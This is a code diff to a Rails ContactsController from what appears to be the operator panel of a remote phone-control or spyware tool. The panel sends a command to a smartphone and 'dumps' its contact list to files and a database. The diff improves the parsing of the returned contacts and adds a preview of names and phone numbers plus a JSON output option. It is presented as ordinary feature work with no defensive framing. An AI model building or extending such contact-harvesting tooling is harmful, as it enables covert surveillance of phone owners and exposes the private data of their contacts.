@@ -16,12 +16,14 @@ class ContactsController < InheritedResources::Base
       
       if pending_command.completed?
         # Process response
-        contacts_data = pending_command.response_data
+        raw_data = pending_command.response_data
+        contacts_data = raw_data['contacts'] || raw_data['payload']&.dig('contacts') || []
         
         # Save to file
         file_path = Rails.root.join('files', 'dumps', 'contacts_dumps', @fileName)
         FileUtils.mkdir_p(File.dirname(file_path))
-        File.write(file_path, format_contacts(contacts_data))
+        formatted_content = format_contacts(contacts_data)
+        File.write(file_path, formatted_content)
         
         # Save to database
         Contact.create!(
@@ -30,7 +32,9 @@ class ContactsController < InheritedResources::Base
           smartphone_id: @smartphone.id
         )
         
-        commandOutput = ["Contacts dumped successfully: #{@fileName}"]
+        # Show first 20 contacts in output
+        preview = contacts_data.first(20).map { |c| "#{c['name']}: #{c['phone_number']}" }
+        commandOutput = ["Contacts dumped successfully: #{@fileName}"] + preview
       else
         error_msg = pending_command.response_data&.dig('error') || 'Unknown error'
         commandOutput = ["Operation Failed: #{error_msg}"]
@@ -41,14 +45,22 @@ class ContactsController < InheritedResources::Base
       commandOutput = ["Operation Failed: #{e.message}"]
     end
     
-    respond_to do |format|
-      format.js {
-        render "dump_contacts", locals: { commandOutput: commandOutput, fileName: @fileName }
-      }
+    if want_json?
+      render json: { output: commandOutput, filename: @fileName }
+    else
+      respond_to do |format|
+        format.js {
+          render "dump_contacts", locals: { commandOutput: commandOutput, fileName: @fileName }
+        }
+      end
     end
   end
   
   private
+
+  def want_json?
+    request.format.json? || request.headers['Accept']&.include?('application/json')
+  end
   
   def format_contacts(contacts_data)
     return "No contacts data" unless contacts_data.is_a?(Array)
